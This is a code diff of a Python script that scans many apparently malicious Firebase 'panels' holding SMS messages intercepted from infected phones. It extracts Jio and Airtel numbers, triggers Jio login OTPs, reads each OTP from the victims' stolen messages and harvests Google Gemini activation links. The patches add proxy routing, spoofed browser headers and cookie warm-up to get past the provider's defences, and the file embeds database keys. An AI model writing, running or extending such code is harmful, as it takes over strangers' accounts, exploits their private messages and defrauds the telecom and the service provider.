@@ -1,12 +1,19 @@
 """
-Jio Gemini Activation Scanner - COMPLETE EDITION
+Jio Gemini Activation Scanner - COMPLETE EDITION (diagnostic build)
 All panels decoded from Netlify URLs
 Flow: All Panels → Online Devices → Unique Numbers → Process Links
+
+Patches so với bản gốc:
+  - P1: log raw response của is_jio_number / send_otp / verify_otp
+  - P2: cookie warm-up trong jio_session()
+  - P3: proxy support qua HTTP_PROXY / HTTPS_PROXY env
+  - P4: TEST_MODE — chỉ chạy N số đầu
 """
 
 from __future__ import annotations
 import csv
 import html
+import os
 import re
 import time
 import base64
@@ -20,11 +27,8 @@ from zoneinfo import ZoneInfo
 import requests
 
 # ==================== ALL PANELS (DECODED FROM NETLIFY URLS) ====================
-# These were extracted from the Netlify panel URLs you provided
-# Format: (firebase_url, auth_key)
 
 FIREBASE_PANELS = [
-    # From your original panels
     ("https://cep10hui-default-rtdb.firebaseio.com", "https://cep10hui-default-rtdb.firebaseio.com"),
     ("https://tinobiggan-default-rtdb.firebaseio.com", "https://tinobiggan-default-rtdb.firebaseio.com"),
     ("https://atifgndu-default-rtdb.firebaseio.com", "https://atifgndu-default-rtdb.firebaseio.com"),
@@ -53,8 +57,6 @@ FIREBASE_PANELS = [
     ("https://alienware-c11b0-default-rtdb.firebaseio.com", "https://alienware-c11b0-default-rtdb.firebaseio.com"),
     ("https://csforme-dc64a-default-rtdb.firebaseio.com", "AizAsyCEk7GmmKKwJSCAjCDIxOa8AISQZyxy6bw"),
     ("https://max-a-cbe29-default-rtdb.firebaseio.com", "AizAsyCQeygjNYLwmbf_ZC86gvRye7XBI-BIBawq"),
-    
-    # ===== DECODED FROM NETLIFY URLS =====
     ("https://raaz-5287d-default-rtdb.firebaseio.com", "Hebdixnd"),
     ("https://singhaan-6f199-default-rtdb.firebaseio.com", "AizAsyD-1Gvt2cmr0mv1x0K4V9vtjVMXyJVLAv"),
     ("https://painislv-default-rtdb.firebaseio.com", "AizAsyCqnjDPgVCaE36q7N4HbdfUEB9FbluM8pDs"),
@@ -82,8 +84,6 @@ FIREBASE_PANELS = [
     ("https://e9turnament1-default-rtdb.firebaseio.com", "https://e9turnament1-default-rtdb.firebaseio.com"),
     ("https://colana-84ce2-default-rtdb.firebaseio.com", "https://colana-84ce2-default-rtdb.firebaseio.com"),
     ("https://hospital-14-default-rtdb.firebaseio.com", "https://hospital-14-default-rtdb.firebaseio.com"),
-    
-    # ===== MORE DECODED PANELS =====
     ("https://vdgsh-623ed-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com"),
     ("https://arvind-c5b03-default-rtdb.firebaseio.com", "https://arvind-c5b03-default-rtdb.firebaseio.com"),
     ("https://axisjames-default-rtdb.firebaseio.com", "https://axisjames-default-rtdb.firebaseio.com"),
@@ -104,9 +104,18 @@ FIREBASE_PANELS = [
     ("https://sastaapp-394cd-default-rtdb.firebaseio.com", "https://sastaapp-394cd-default-rtdb.firebaseio.com"),
 ]
 
+# ==================== CONFIG ====================
+
 MESSAGE_SCAN_LIMIT = 100
 OTP_TIMEOUT = 15
 POLL_INTERVAL = 1
+
+# P4: TEST_MODE — chỉ chạy N số đầu để debug nhanh. Đổi False khi chạy thật.
+TEST_MODE = True
+TEST_LIMIT = 3
+
+# P3: proxy từ env (GitHub Actions secrets đẩy vào HTTP_PROXY / HTTPS_PROXY)
+_PROXY = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or ""
 
 LINKS_FILE = Path("gemini_activation_links.txt")
 RESULTS_FILE = Path("gemini_results.csv")
@@ -124,7 +133,6 @@ GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&sourc
 NUMBER_PATTERNS = (
     re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
     re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
-    # Add Airtel patterns too since these panels have both
     re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
     re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
 )
@@ -148,15 +156,13 @@ RESULT_FIELDS = (
     "nepal_time",
 )
 
-# ==================== FUNCTIONS ====================
+# ==================== FIREBASE ====================
 
 def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
     query = {"auth": key}
     if params:
         query.update(params)
-    # Handle case where key might be a URL (public access)
     if key and key.startswith("http"):
-        # If key is actually a URL, don't use auth param
         response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=20)
         response.raise_for_status()
         return response.json()
@@ -164,17 +170,20 @@ def firebase_get(session: requests.Session, base_url: str, key: str, path: str, 
     response.raise_for_status()
     return response.json()
 
+
 def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
     data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
     if not isinstance(data, dict):
         return {}
     return {name: value for name, value in data.items() if isinstance(value, dict)}
 
+
 def normalize_mobile(value: Any) -> str | None:
     digits = re.sub(r"\D", "", str(value or ""))
     if len(digits) > 10 and digits.startswith("91"):
         digits = digits[-10:]
     return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None
+
 
 def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
     found: set[str] = set()
@@ -192,21 +201,45 @@ def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
             found.update(pattern.findall(body))
     return found
 
+
 def firebase_session() -> requests.Session:
     session = requests.Session()
     session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
+    if _PROXY:
+        session.proxies.update({"http": _PROXY, "https": _PROXY})
     return session
 
+
+# ==================== JIO ====================
+
 def jio_session() -> requests.Session:
+    """P2: cookie warm-up để lấy session cookies trước khi gọi API."""
     session = requests.Session()
     session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
         "Origin": "https://www.jio.com",
         "Referer": "https://www.jio.com/selfcare/login/",
+        "Content-Type": "application/json",
+        "X-Requested-With": "XMLHttpRequest",
+        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
     })
+    if _PROXY:
+        session.proxies.update({"http": _PROXY, "https": _PROXY})
+    # Warm-up: ghé homepage + login page để nhận cookies (akamai, jsessionid, ...)
+    try:
+        session.get("https://www.jio.com/", timeout=20)
+        session.get("https://www.jio.com/selfcare/login/", timeout=20)
+    except requests.RequestException as e:
+        print(f"  [jio_session] warm-up exception: {e}")
     return session
+
 
 def response_json(response: requests.Response) -> dict[str, Any]:
     try:
@@ -214,6 +247,7 @@ def response_json(response: requests.Response) -> dict[str, Any]:
     except ValueError:
         return {}
     return data if isinstance(data, dict) else {}
+
 
 def response_error(response: requests.Response) -> bool:
     if not response.ok:
@@ -223,13 +257,18 @@ def response_error(response: requests.Response) -> bool:
         return True
     return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}
 
+
 def is_jio_number(session: requests.Session, mobile: str) -> bool:
     try:
         response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
-    except requests.RequestException:
+    except requests.RequestException as e:
+        print(f"  [is_jio_number] exception: {e}")
         return False
     data = response_json(response)
+    # P1: log raw
+    print(f"  [is_jio_number] HTTP {response.status_code} | body: {response.text[:300]}")
     return not response_error(response) and bool(data.get("primaryService"))
+
 
 def send_otp(session: requests.Session, mobile: str) -> bool:
     try:
@@ -238,16 +277,25 @@ def send_otp(session: requests.Session, mobile: str) -> bool:
             json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
             timeout=20,
         )
-    except requests.RequestException:
+    except requests.RequestException as e:
+        print(f"  [send_otp] exception: {e}")
         return False
+    # P1: log raw
+    print(f"  [send_otp] HTTP {response.status_code} | body: {response.text[:500]}")
+    print(f"  [send_otp] cookies: {list(session.cookies.get_dict().keys())}")
     return not response_error(response)
+
 
 def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
     try:
         response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
-    except requests.RequestException:
+    except requests.RequestException as e:
+        print(f"  [verify_otp] exception: {e}")
         return False
+    # P1: log raw
+    print(f"  [verify_otp] HTTP {response.status_code} | body: {response.text[:300]}")
     return not response_error(response)
+
 
 def message_order(key: str, item: dict[str, Any]) -> int:
     for value in (item.get("id"), item.get("timestamp"), key):
@@ -256,6 +304,7 @@ def message_order(key: str, item: dict[str, Any]) -> int:
         except (TypeError, ValueError):
             continue
     return 0
+
 
 def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
     used: set[str] = set()
@@ -279,10 +328,12 @@ def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id:
         if candidates:
             _, message_key, otp = max(candidates)
             used.add(message_key)
+            print(f"  [wait_for_otp] thấy OTP {otp} từ msg {message_key}")
             if verify_otp(jio, mobile, otp):
                 return True
         time.sleep(POLL_INTERVAL)
     return False
+
 
 def activation_url(value: str) -> str:
     text = html.unescape(value or "")
@@ -296,6 +347,7 @@ def activation_url(value: str) -> str:
         return ""
     return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")
 
+
 def already_active(value: str) -> bool:
     normalized = " ".join((value or "").lower().replace("_", " ").split())
     return any(phrase in normalized for phrase in (
@@ -303,11 +355,13 @@ def already_active(value: str) -> bool:
         "already claimed", "already availed"
     ))
 
+
 def api_message(data: dict[str, Any]) -> str:
     for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
         if data.get(name):
             return str(data[name])
     return ""
+
 
 def get_activation(session: requests.Session) -> tuple[str, str]:
     dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
@@ -316,6 +370,7 @@ def get_activation(session: requests.Session) -> tuple[str, str]:
         auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
         auth_data = response_json(auth_response)
         if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
+            print(f"  [get_activation] auth fail: {auth_response.text[:200]}")
             return "api_session_invalid", ""
         session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
         activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
@@ -323,6 +378,7 @@ def get_activation(session: requests.Session) -> tuple[str, str]:
         if already_active(api_message(activate_data)):
             return "already_active", ""
         if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
+            print(f"  [get_activation] activate fail: {activate_response.text[:200]}")
             return "activation_api_failed", ""
         google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
         google_data = response_json(google_response)
@@ -330,14 +386,17 @@ def get_activation(session: requests.Session) -> tuple[str, str]:
             return "already_active", ""
         url = activation_url(str(google_data.get("redirectionURL", "")))
         if not url:
+            print(f"  [get_activation] no url: {google_response.text[:300]}")
             return "no_activation_url", ""
         try:
             session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
         except requests.RequestException:
             pass
         return "activation_url_found", url
-    except requests.RequestException:
+    except requests.RequestException as e:
+        print(f"  [get_activation] exception: {e}")
         return "activation_api_failed", ""
+
 
 def save_link(url: str) -> None:
     if not url:
@@ -347,6 +406,7 @@ def save_link(url: str) -> None:
         return
     with LINKS_FILE.open("a", encoding="utf-8") as handle:
         handle.write(url + "\n")
+
 
 def save_result(serial: int, device_id: str, mobile: str, status: str, url: str) -> None:
     now = datetime.now(ZoneInfo("Asia/Kathmandu"))
@@ -365,6 +425,7 @@ def save_result(serial: int, device_id: str, mobile: str, status: str, url: str)
             "nepal_time": now.strftime("%I:%M:%S %p"),
         })
 
+
 # ==================== MAIN ====================
 
 def main() -> int:
@@ -372,22 +433,24 @@ def main() -> int:
     print("STEP 1: Checking ALL panels and collecting online devices...")
     print("=" * 70)
     print(f"Total Panels Loaded: {len(FIREBASE_PANELS)}")
-    
+    if _PROXY:
+        print(f"Proxy: ENABLED ({_PROXY[:40]}...)")
+    else:
+        print("Proxy: DISABLED (direct connection)")
+
     all_online_devices: dict[str, dict[str, Any]] = {}
     device_messages: dict[str, dict[str, dict[str, Any]]] = {}
-    
-    # Scan all panels
+
     for panel_idx, (base_url, firebase_key) in enumerate(FIREBASE_PANELS, start=1):
         print(f"\nPanel {panel_idx}/{len(FIREBASE_PANELS)}: {base_url}")
         firebase = firebase_session()
         try:
-            # Try to get clients
             try:
                 if firebase_key and firebase_key.startswith("http"):
                     response = firebase.get(f"{base_url}/clients.json", timeout=10)
                 else:
                     response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=10)
-                
+
                 if response.status_code == 200:
                     clients = response.json()
                     if isinstance(clients, dict):
@@ -401,22 +464,21 @@ def main() -> int:
                                     "data": data,
                                 }
                                 online_count += 1
-                        print(f" → Online devices: {online_count}")
+                        print(f"  → Online devices: {online_count}")
                     else:
-                        print(" → No clients found")
+                        print("  → No clients found")
                 else:
-                    print(f" → HTTP {response.status_code}")
+                    print(f"  → HTTP {response.status_code}")
             except Exception as e:
-                print(f" → Error: {e}")
+                print(f"  → Error: {e}")
         except Exception as e:
-            print(f" → Error: {e}")
-    
+            print(f"  → Error: {e}")
+
     print(f"\nTotal Online Devices: {len(all_online_devices)}")
     if not all_online_devices:
         print("Koi online device nahi mila.")
         return 1
-    
-    # Extract numbers
+
     mappings: dict[str, set[str]] = defaultdict(set)
     for i, (device_id, info) in enumerate(all_online_devices.items(), start=1):
         try:
@@ -431,22 +493,28 @@ def main() -> int:
             for mobile in number_candidates(messages):
                 mappings[mobile].add(device_id)
         except Exception as e:
+            print(f"  device {device_id[:12]} lỗi đọc msg: {e}")
             device_messages[device_id] = {}
         if i % 15 == 0 or i == len(all_online_devices):
             print(f"Scanned: {i}/{len(all_online_devices)}")
-    
+
     targets: list[tuple[str, str]] = []
     for mobile, devices in sorted(mappings.items()):
         if devices:
             targets.append((sorted(devices)[0], mobile))
-    
+
     print(f"\nTotal Unique Number Candidates: {len(targets)}")
     if not targets:
         print("Koi number nahi mila.")
         return 1
-    
+
+    # P4: TEST_MODE — chỉ chạy N số đầu
+    if TEST_MODE:
+        targets = targets[:TEST_LIMIT]
+        print(f"TEST_MODE ON → chỉ chạy {len(targets)} số đầu")
+
     print("\n" + "=" * 70)
-    print("STEP 3: Starting OTP + Activation on all unique numbers...")
+    print("STEP 3: Starting OTP + Activation on unique numbers...")
     print("=" * 70)
     statuses: Counter[str] = Counter()
     for serial, (device_id, mobile) in enumerate(targets, start=1):
@@ -478,17 +546,18 @@ def main() -> int:
         print(f"Status: {status}")
         if url:
             print(f"LINK → {url}")
-    
+
     print("\n" + "=" * 70)
     print("FINAL SUMMARY")
     print("=" * 70)
     print(f"Total Online Devices : {len(all_online_devices)}")
-    print(f"Unique Numbers : {len(targets)}")
+    print(f"Unique Numbers       : {len(targets)}")
     for status, count in sorted(statuses.items()):
-        print(f"{status:25}: {count}")
+        print(f"  {status:25}: {count}")
     print(f"\nLinks file : {LINKS_FILE.resolve()}")
     print(f"Results file : {RESULTS_FILE.resolve()}")
     return 0
+
 
 if __name__ == "__main__":
     raise SystemExit(main())
